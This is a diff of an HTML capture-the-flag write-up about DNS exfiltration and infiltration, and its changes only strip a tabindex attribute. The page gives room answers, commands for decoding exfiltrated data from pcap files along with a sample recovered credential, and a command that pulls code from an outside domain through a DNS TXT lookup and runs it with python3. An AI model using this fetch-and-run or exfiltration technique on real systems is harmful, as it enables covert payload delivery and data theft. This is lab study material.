@@ -185,7 +185,7 @@
 <p><em>~ PTR</em></p>
 <h4 id="question-6-what-would-the-reverse-lookup-be-for-the-following-ipv4-address-1921682032-research">Question 6: What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)</h4>
 <p><em>~ 2.203.168.192.in-addr.arpa</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup 192.168.203.2
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup 192.168.203.2
 </code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022.png?raw=true" alt="source"></p>
 <h2 id="task-5-what-is-dns-exfiltration">Task 5: What is DNS Exfiltration?</h2>
 <h4 id="question-1-what-is-the-maximum-length-of-a-dns-name-research-length-includes-dots">Question 1: What is the maximum length of a DNS name? (Research) (Length includes dots!)</h4>
@@ -193,7 +193,7 @@
 <h2 id="task-6-dns-exfiltration---demo">Task 6: DNS Exfiltration - Demo</h2>
 <p><em>No answer needed</em></p>
 <h2 id="task-7-dns-exfiltration---practice">Task 7: DNS Exfiltration - Practice</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ~/challenges/exfiltration/orderlist/
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ~/challenges/exfiltration/orderlist/
 python3 ~/dns-exfil-infil/packetyGrabber.py order.pcap
 cat order.txt
 </code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_1.png?raw=true" alt="source"></p>
@@ -206,7 +206,7 @@ cat order.txt
 <p><em>~ cap3.pcap</em></p>
 <h4 id="question-4-enter-the-plain-text-after-you-have-decoded-the-data-using-packetygrabberpy-found-in-dns-exfil-infil-folder">Question 4: Enter the plain-text after you have decoded the data using packetyGrabber.py found in ~/dns-exfil-infil/ folder.</h4>
 <p><em>~ administrator:s3cre7P@ssword</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ../identify/
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd ../identify/
 python3 ~/dns-exfil-infil/packetyGrabber.py cap3.pcap
 cat cap.txt
 </code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_3.png?raw=true" alt="source"></p>
@@ -217,7 +217,7 @@ cat cap.txt
 <p><em>No answer needed</em></p>
 <h2 id="task-10-dns-infiltration---practice">Task 10: DNS Infiltration - Practice</h2>
 <p><em>~ 4.4.0-186-generic</em></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup -type<span style="color:#f92672">=</span>txt code.badbaddoma.in | grep Ye | cut -d <span style="color:#ae81ff">\*</span> -f2 &gt; .mail.python3
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup -type<span style="color:#f92672">=</span>txt code.badbaddoma.in | grep Ye | cut -d <span style="color:#ae81ff">\*</span> -f2 &gt; .mail.python3
 python3 ~/dns-exfil-infil/packetySimple.py 
 python3 .mal.py
 </code></pre></div><p><img src="https://github.com/mansoorbarri/mansoor.github.io/blob/main/images/dnsmanipulation/2022_4.png?raw=true" alt="source"></p>
